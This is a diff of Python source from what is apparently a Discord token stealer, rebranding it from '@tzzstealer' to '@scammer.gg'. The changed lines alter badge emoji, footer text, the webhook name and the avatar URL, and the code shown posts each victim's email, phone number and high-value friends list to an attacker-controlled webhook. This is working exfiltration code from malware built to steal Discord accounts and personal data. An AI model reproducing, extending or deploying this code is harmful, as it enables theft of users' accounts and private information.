@@ -186,7 +186,7 @@ class upload_tokens:
                 "ind": 131072
             },
             "ACTIVE_DEVELOPER": {
-                "emoji": "<:Active_Dev:1045024909690163210>",
+                "emoji": "<:active:1041115919751073871>",
                 "shift": 22,
                 "ind": 4194304
             },
@@ -344,16 +344,16 @@ class upload_tokens:
             embed.add_field(name="<a:rainbowheart:996004226092245072> Email:", value=f"{email if email != None else 'None'}", inline=True)
             embed.add_field(name="<:starxglow:996004217699434496> Phone:", value=f"{phone if phone != None else 'None'}", inline=True)    
 
-            embed.set_footer(text="@tzzstealer")
+            embed.set_footer(text="@scammer.gg")
 
-            self.webhook.send(embed=embed, username="Tzz", avatar_url="https://cdn.discordapp.com/attachments/1027934499100692530/1051562569355247716/502474a8-a304-4df0-a410-0e2e04b634cc.jpg")
+            self.webhook.send(embed=embed, username="scammer.gg", avatar_url="https://cdn.discordapp.com/attachments/1051616879610970202/1052682510527647764/502474a8-a304-4df0-a410-0e2e04b634cc.jpg")
 
             
             HQembed = Embed(title = "<:0_ubpig:974784458504933456> HQ Friends:", color=0x000000)
             if hq_friends != None:
-                embed.add_field(value=hq_friends, inline=False)
+                embed.add_field(name="",value=hq_friends, inline=False)
                 embed.add_field(name="\u200b", value="\u200b", inline=False)
 
-            embed.set_footer(text="@tzzstealer")
+            embed.set_footer(text="@scammer.gg")
 
-            self.webhook.send(embed=HQembed, username="Tzz", avatar_url="https://cdn.discordapp.com/attachments/1027934499100692530/1051562569355247716/502474a8-a304-4df0-a410-0e2e04b634cc.jpg")
+            self.webhook.send(embed=HQembed, username="scammer.gg", avatar_url="https://cdn.discordapp.com/attachments/1051616879610970202/1052682510527647764/502474a8-a304-4df0-a410-0e2e04b634cc.jpg")
